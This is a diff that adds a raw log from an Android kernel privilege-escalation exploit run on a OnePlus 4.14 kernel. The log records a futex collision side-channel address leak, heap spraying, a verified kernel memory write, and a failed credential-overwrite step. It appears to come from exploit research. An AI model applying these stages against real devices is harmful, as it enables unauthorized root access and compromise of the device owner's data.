@@ -1,0 +1,54 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffffc002f640b0
+[32m[+] [0mstartup context pid=7216 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=7216 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=7216 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=7216 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffffc02a4021a0 bootid_data=ffffffc02a6aa868 init_task=ffffffc02a40cf00 root_tg=ffffffc02a63d580 sysctl_bootid=ffffffc02a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x7ffffffff
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000746a1de0c8
+[33m[*] [0mpass A: 65536 candidates, bucket piled
+[33m[*] [0mpass B: re-measuring unpiled
+[33m[*] [0m  000000646a1f1658  (1590 > 3x0)[33m[*] [0m  000000646a2cad20  (1586 > 3x0)[33m[*] [0m  000000646d0efe48  (968 > 3x0)[33m[*] [0m  000000646d1f8690  (964 > 3x0)[33m[*] [0m  000000646e08cb30  (953 > 3x0)[33m[*] [0m  000000646f057988  (1168 > 3x0)[33m[*] [0m  000000646f0d1d58  (983 > 3x0)[33m[*] [0m  000000646fdd6580  (985 > 3x0)[33m[*] [0m  0000006470085af8  (989 > 3x0)[33m[*] [0m  00000064703dd5b8  (960 > 3x0)[33m[*] [0m  0000006470690b50  (960 > 3x0)[33m[*] [0m  0000006470edddb8  (1559 > 3x0)[33m[*] [0m  0000006471ae0dd0  (1544 > 3x0)[33m[*] [0m  0000006471d93368  (1545 > 3x0)[33m[*] [0m  0000006472d24ff0  (1552 > 3x0)[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  7] start finding mm_struct [fffffff7c0000000-0000000000000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffffefc0000000-fffffff800000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffffc000000000-ffffffc800000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffffc7c0000000-ffffffd000000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffffe7c0000000-fffffff000000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffffdfc0000000-ffffffe800000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffffcfc0000000-ffffffd800000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffffd7c0000000-ffffffe000000000]
+[33m[*] [0m[p3] bruteforce returned cnt=1 best=16[33m[*] [0m[probe] candidate 0/1 = 0xffffffc0b0318000
+[33m[*] [0mKernelSnitch bruteforce: state=4 found=0 mm_struct=0xffffffc0b0318000
+[33m[*] [0m[probe] base=ffffffc0b0318000 payload_mode=0 entering skb payload[33m[*] [0m[p5] tile 0/10 fake_lock=ffffffc0b0318000
+[33m[*] [0m[p5] prepare_skb_payload returned ok[33m[*] [0m[p4] skb payload built, reclaim setup[33m[*] [0mdone
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0mVERIFY: target=ffffffc0b0318148 (mm+brk) value=0000000cafeb0000
+[33m[*] [0mVERIFY: slot=9 target=ffffffc0b0318148
+[33m[*] [0m=== VERIFY brk write === target=0xffffffc0b0318148 mode=3
+[33m[*] [0mattempt round (persisted) = 4
+[33m[*] [0m[T+292498ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=ffffffc0b0318000
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+293049ms]   heap spray done
+[33m[*] [0mpvm overlay: target=ffffffc0b0318148 value=0000000000000000 lock=ffffffc0b0318000 sgi0=6 siov0=5300000000000000 siov1=5300000000000200
+[33m[*] [0mconsumer: walk fired tid=15235 ret=0 errno=0 calls=1 success=1
+[33m[*] [0mpvm overlay: sendmsg ret=-1 errno=14 walk_done=1 calls=1 success=1
+[33m[*] [0m[T+294057ms]   PI route done
+[33m[*] [0mVERIFY: slot=9 brk(0)=00000056e36fa000 (orig 00000056e36fa000)
+[33m[*] [0mUMH not available, falling back to W2 cred path
+[33m[*] [0m[T+298829ms] pre-W2 drain
+[31m[!] [0mperf_event_open failed errno=13
+[33m[*] [0m[T+298832ms] perf_find_task done
+[33m[*] [0mperf returned 0, retrying...
+[31m[!] [0mperf_event_open failed errno=13
+[31m[!] [0mCannot find task_struct (perf blocked by seccomp?)
